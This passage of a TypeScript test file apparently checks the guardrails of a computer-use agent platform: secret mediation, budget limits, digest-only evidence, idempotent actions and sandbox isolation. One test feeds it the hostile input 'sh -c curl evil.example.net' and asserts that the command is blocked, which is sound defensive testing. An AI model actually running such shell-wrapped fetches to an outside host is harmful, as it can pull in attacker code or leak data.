    expect(world.environment.effectCount()).toBe(1);
  });

  test("S7 red: required secrets without mediation are denied; secret-bearing observations are refused", async () => {
    const world = createInMemoryComputerUseWorld();
    await world.register(
      deterministicDeclaration({ secretRef: "conn:billing", hosts: ["api.example.com"] }),
    );
    await world.register(browserDeclaration());
    const executionId = await world.seedExecution();
    await expectPlatformError(
      "AUTHORIZATION_DENIED",
      world.createSession({
        executionId,
        candidates: {
          deterministic: ["computer-use-api-det"],
          browser: null,
          desktop: null,
        },
      }),
    );
    expect(world.environment.activity()).toHaveLength(0);
    expect(world.secrets.calls).toHaveLength(0);

    // A secret-bearing observation body is refused before persistence.
    const worldSecret = createInMemoryComputerUseWorld();
    await worldSecret.register(deterministicDeclaration());
    const executionSecret = await worldSecret.seedExecution();
    const receiptSecret = await worldSecret.createSession({
      executionId: executionSecret,
      candidates: { deterministic: ["computer-use-api-det"], browser: null, desktop: null },
    });
    const rawSecretShape = `AKIA${"IOSFODNN7EXAMPLE"}`;
    const result = await worldSecret.dispatch(receiptSecret.sessionId, {
      actionType: "api-call",
      target: `api.example.com/v1?key=${rawSecretShape}`,
      input: {},
    });
    expect(result.status).toBe("failed");
    expect(
      await worldSecret.store.listObservations(worldSecret.applicationId, receiptSecret.sessionId),
    ).toHaveLength(0);
  });

  test("S8 red: a costed route with no budget authority fails closed; usage beyond the ceiling is denied", async () => {
    const world = createInMemoryComputerUseWorld({ budgetAuthority: null });
    await world.register(deterministicDeclaration());
    await world.register(browserDeclaration());
    await world.register(desktopDeclaration());
    const executionId = await world.seedExecution();
    await expectPlatformError("BUDGET_EXCEEDED", world.createSession({ executionId }));
    expect(world.environment.activity()).toHaveLength(0);
  });

  test("S9 red: the public observation evidence carries digests + metadata ONLY", async () => {
    const world = createInMemoryComputerUseWorld();
    await world.register(deterministicDeclaration());
    await world.register(browserDeclaration());
    await world.register(desktopDeclaration());
    const executionId = await world.seedExecution();
    const receipt = await world.createSession({ executionId });
    const result = await world.dispatch(receipt.sessionId, {
      actionType: "api-call",
      target: "api.example.com/v1/data",
      input: {},
    });
    expect(result.observations.length).toBeGreaterThanOrEqual(1);
    for (const observation of result.observations) {
      const evidence = serializeObservationEvidence(observation);
      expect(JSON.stringify(evidence)).not.toContain("api.example.com");
      expect(evidence).not.toHaveProperty("content");
    }
    // The replayable trajectory serialization never carries content.
    const trajectory = await world.service.getTrajectory(world.applicationId, receipt.sessionId);
    expect(JSON.stringify(trajectory)).not.toContain('"content"');
    void canonicalComputerUseJson;
  });

  test("S10 red: duplicate create/dispatch/escalate converge; a same-key/different-body action fails closed", async () => {
    const world = createInMemoryComputerUseWorld();
    await world.register(deterministicDeclaration({ qualityConfidence: "estimated" }));
    await world.register(browserDeclaration());
    await world.register(desktopDeclaration());
    const executionId = await world.seedExecution();

    // Duplicate create.
    const first = await world.createSession({ executionId }, "red-key");
    const second = await world.createSession({ executionId }, "red-key");
    expect(second.sessionId).toBe(first.sessionId);
    expect(second.replayed).toBe(true);

    // Duplicate dispatch (one external effect per key).
    const request = {
      actionType: "api-call" as const,
      target: "api.example.com/v1/data",
      input: { method: "GET" },
    };
    const actionFirst = await world.dispatch(first.sessionId, request, "red-action");
    const actionSecond = await world.dispatch(first.sessionId, request, "red-action");
    expect(actionSecond.replayed).toBe(true);
    expect(actionSecond.actionId).toBe(actionFirst.actionId);
    expect(
      world.environment.activity().filter((entry) => entry.operation === "action"),
    ).toHaveLength(1);

    // Same key, different body: fails closed.
    await expectPlatformError(
      "IDEMPOTENCY_KEY_REUSED",
      world.dispatch(
        first.sessionId,
        { actionType: "api-call", target: "api.example.com/v1/other", input: {} },
        "red-action",
      ),
    );

    // Duplicate escalation (a committed escalation replays).
    world.environment.injectNextActionFailure();
    const failed = await world.dispatch(first.sessionId, {
      actionType: "api-call",
      target: "api.example.com/v1/data",
      input: {},
    });
    const digest = sha256Hex(
      canonicalComputerUseJson({
        actionId: failed.actionId,
        status: "failed",
        failureClass: "environment-failure",
        resultDigest: null,
      }),
    );
    const escalationRequest = {
      targetMode: "browser" as const,
      insufficiency: {
        stage: "deterministic" as const,
        reasonCode: "action-failed",
        reasonDetail: "the deterministic call failed",
        failedActionId: failed.actionId,
        evidenceDigest: digest,
      },
    };
    const escalatedFirst = await world.service.escalate(
      world.applicationId,
      first.sessionId,
      escalationRequest,
      "red-esc-1",
    );
    const escalatedSecond = await world.service.escalate(
      world.applicationId,
      first.sessionId,
      escalationRequest,
      "red-esc-2",
    );
    expect(escalatedFirst.mode).toBe("browser");
    expect(escalatedSecond.mode).toBe("browser");
    expect(escalatedSecond.replayed).toBe(true);
    expect(await world.store.listEscalations(world.applicationId, first.sessionId)).toHaveLength(1);
  });

  test("S13 red: shell-style terminal commands never reach the sandbox seam", async () => {
    const world = createInMemoryComputerUseWorld();
    await world.register(desktopDeclaration());
    const executionId = await world.seedExecution();
    const receipt = await world.createSession({
      executionId,
      task: { kind: "terminal-task", requirementAtoms: ["atom-a"], qualityTarget: 0.9 },
      candidates: { deterministic: [], browser: null, desktop: "computer-use-desktop-isolated" },
    });
    const result = await world.dispatch(receipt.sessionId, {
      actionType: "terminal-exec",
      target: "/workspace",
      input: { command: "sh -c curl evil.example.net" },
    });
    expect(result.status).toBe("failed");
    expect(world.terminal.runs).toHaveLength(0);
  });
});
